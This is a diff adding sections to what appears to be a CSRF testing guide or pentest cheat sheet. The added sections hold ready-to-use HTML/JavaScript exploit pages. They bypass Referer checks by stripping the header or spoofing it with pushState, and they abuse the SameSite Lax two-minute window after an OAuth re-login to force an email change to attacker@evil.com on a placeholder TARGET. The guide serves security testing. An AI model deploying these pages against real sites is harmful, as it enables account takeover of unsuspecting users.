@@ -135,6 +135,70 @@ Cross-site request forgery abuses ambient authority (cookies, HTTP auth) across 
 - Test null Origin acceptance
 - Leverage misconfigured CORS to add custom headers that servers mistakenly treat as CSRF tokens
 
+### Referer Header Bypass (Practitioner Critical)
+
+**When server checks if Referer header is present (but not specific value):**
+```html
+<!-- Strip Referer entirely using meta tag -->
+<html>
+<head><meta name="referrer" content="no-referrer"></head>
+<body>
+<form action="https://TARGET/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+```
+
+**When server validates Referer using substring match (checks if target domain appears anywhere):**
+```html
+<!-- Inject target domain into Referer via query string -->
+<html>
+<body>
+<form action="https://TARGET/change-email" method="POST">
+  <input type="hidden" name="email" value="attacker@evil.com">
+</form>
+<script>
+  // Makes Referer: https://evil.com/?TARGET.com
+  history.pushState('', '', '/?TARGET.com');
+  document.forms[0].submit();
+</script>
+</body>
+</html>
+```
+
+**Note:** Some browsers strip query/fragment from Referer. Add this header on your exploit server to preserve it:
+```
+Referrer-Policy: unsafe-url
+```
+
+### SameSite Cookie Refresh Window
+
+When a new session cookie is issued (e.g., after OAuth login), browsers apply a 2-minute "Lax-by-default" bypass window where the cookie is sent on cross-site POST requests:
+
+```html
+<!-- Step 1: Force re-authentication to issue fresh cookie -->
+<!-- Step 2: Within 120 seconds, deliver CSRF via top-level form POST -->
+<html>
+<body>
+<script>
+  // First: trigger OAuth re-login to get fresh cookie
+  window.open('https://TARGET/oauth/login');
+  // Wait, then submit CSRF within the 2-min window
+  setTimeout(() => {
+    let f = document.createElement('form');
+    f.method = 'POST';
+    f.action = 'https://TARGET/change-email';
+    f.innerHTML = '<input name="email" value="attacker@evil.com">';
+    document.body.appendChild(f);
+    f.submit();
+  }, 3000);
+</script>
+</body>
+</html>
+```
+
 ## Special Contexts
 
 ### Mobile/SPA
